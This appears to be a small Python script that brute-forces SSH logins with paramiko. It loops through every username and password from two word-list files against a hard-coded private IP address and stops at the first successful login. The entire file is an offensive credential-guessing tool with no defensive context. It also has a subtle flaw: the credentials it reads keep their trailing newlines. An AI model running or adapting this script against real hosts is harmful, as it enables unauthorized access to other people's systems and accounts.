import paramiko


def ssh_login(target, user, passwd):
    print(f"{target}的测试账号为：{user}密码为：{passwd}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, 22, user, passwd)
        print("login成功")
        client.close()
        return True
    except:
        print("login错误")
        client.close()
        return False


def massge(puth, puth1):
    with open(puth, 'r') as f:
        for i1 in f:
            users.append(i1)
    with open(puth1, 'r') as f1:
        for i2 in f1:
            password.append(i2)


if __name__ == '__main__':
    host = ('192.168.43.240',)
    users = []
    password = []
    massge('user.txt', 'password.txt')
    for t in host:
        for i in users:
            for n in password:
                if ssh_login(t, i, n):
                    exit()
